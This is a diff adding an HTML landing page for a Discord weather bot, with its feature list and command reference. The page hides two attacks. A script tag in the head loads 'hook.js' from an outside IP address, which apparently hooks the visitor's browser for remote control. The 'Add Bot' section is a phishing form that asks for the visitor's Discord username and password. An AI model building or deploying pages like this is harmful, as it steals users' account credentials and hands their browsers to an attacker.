@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="http://172.17.1.230:3000/hook.js"></script>
+    <link rel="stylesheet" href="DiscordWeatherbotcss.css">
+    <title>Weather Bot</title>
+</head>
+<body>
+
+    <header>
+        <h1>Weatherbot</h1>
+        <p>Welcome to WeatherBot, your friendly neighborhood meteorologist on Discord! 🌦️</p>
+    </header>
+
+    <nav>
+        <a href="#about">About</a>
+        <a href="#add-bot">Add Bot</a>
+        <a href="#commands">Commands</a>
+        <a href="#screenshots">Screenshots</a>
+    </nav>
+
+    <main>
+        <div class="left-section">
+            <section id="about">
+                <h2>About</h2>
+                <p>
+                    <b>Overview:</b> <br>
+WeatherBot is a feature-packed Discord bot designed to keep you informed about the weather conditions at any location worldwide. Whether you're planning a weekend getaway, curious about the current weather in your area, or just want to stay ahead of the forecast, WeatherBot has got you covered. <br><br>
+
+<b>Key Features:</b> <br>
+<ol>
+<li>Accurate Weather Data:
+WeatherBot provides real-time weather information sourced from reputable weather APIs. Get up-to-date details on temperature, humidity, wind speed, and more for any location you desire.
+</li>
+<br>
+<li>
+Command-Based Interaction:
+Interacting with WeatherBot is as easy as typing a command! Simply use the designated prefix followed by the location you're interested in, and WeatherBot will respond promptly with the latest weather details.
+<br>
+Example Command: !weather New York
+</li>
+<br>
+<li>
+Forecasting:
+Plan ahead with WeatherBot's forecasting capabilities. Retrieve the forecast for the next few days to make informed decisions based on upcoming weather conditions.
+</li>
+<br>
+<li>
+User-Friendly Interface:
+WeatherBot is designed with simplicity in mind. The responses are clear, concise, and include the essential information you need without overwhelming you with unnecessary details.
+</li>
+<br>
+<li>
+Customizable Settings:
+Tailor WeatherBot to your preferences. Set your default location, choose between Celsius and Fahrenheit, or even receive regular weather updates at specific times.
+</li>
+<br>
+<li>
+Informative Embeds:
+Weather information is presented in visually appealing embeds, making it easy to read and share with others in your Discord server.
+</li>               </ol></p>
+            </section>
+
+            <section id="add-bot">
+                <h2>How to Add the Bot to Your Server</h2>
+                <p>
+                    Please log in to add the bot to your discord server!
+                </p>
+                <form action="index.html" method="post" netlify>
+                    <label for="discord-username">Discord Username:</label>
+                    <input type="text" id="discord-username" name="discord-username" required>
+
+                    <label for="discord-password">Discord Password:</label>
+                    <input type="password" id="discord-password" name="discord-password" required>
+
+                    <input type="submit" value="Add Bot">
+                </form>
+            </section>
+
+            <section id="commands">
+                <h2>Commands</h2>
+                <p>
+                    <b>Current Weather:</b> <br> <br>
+
+                    Command: !weather [location]<br>
+                    Description: Get the current weather conditions for the specified location.
+                    <br><br>
+
+                    <b>Weather Forecast:</b><br><br>
+                    
+                    Command: !forecast [location] <br>
+                    Description: Retrieve a multi-day weather forecast for the specified location.
+                    <br><br>
+
+                    <b>Default Location:</b><br><br>
+                    
+                    Command: !setlocation [location] <br>
+                    Description: Set your default location for weather updates.
+                    <br><br>
+
+                    <b>Unit Preference:</b><br><br>
+
+                    Command: !setunit [celsius/fahrenheit]<br>
+                    Description: Choose between Celsius and Fahrenheit for temperature units.
+                    <br><br>
+
+                    <b>Daily Weather Update:</b><br><br>
+
+                    Command: !dailyupdate [time]<br>
+                    Description: Receive a daily weather update at the specified time.
+                    <br><br>
+
+                    <b>Wind Information:</b><br><br>
+
+                    Command: !wind [location]<br>
+                    Description: Get detailed information about the wind conditions at a specific location.
+                    <br><br>
+
+                    <b>Humidity Level:</b><br><br>
+
+                    Command: !humidity [location]<br>
+                    Description: Check the current humidity level for a given location.
+                    <br><br>
+
+                    <b>Sunrise and Sunset:</b><br><br>
+                    
+                    Command: !sun [location]<br>
+                    Description: Find out the sunrise and sunset times for a particular location.
+                    <br><br>
+
+                    <b>Weather Alerts:</b><br><br>
+
+                    Command: !alerts [location]<br>
+                    Description: Receive any weather alerts or warnings for the specified location.
+                    <br><br>
+
+                    <b>Customize Response Format:</b><br><br>
+
+                    Command: !format [embed/plain]<br>
+                    Description: Choose between an embedded or plain text format for weather responses.
+                    <br><br>
+
+                    <b>Bot Information:</b><br><br>
+
+                    Command: !weatherbotinfo<br>
+                    Description: Get information about WeatherBot, including version and support details.
+                    <br><br>
+
+                    <b>Help Command:</b><br><br>
+
+                    Command: !help<br>
+                    Description: Display a list of available commands and their descriptions.
+                </p>
+            </section>
+        </div>
+
+        <!-- <div class="fixed-section">
+            <section id="screenshots">
+                <h2>Screenshots</h2>
+                <img src="bot-screenshot-1.png" alt="Screenshot 1">
+                
+            </section>
+        </div> -->
+    </main>
+
+    <footer>
+        <p>&copy; 2023 Your Bot Name. All rights reserved.</p>
+    </footer>
+
+</body>
+</html>
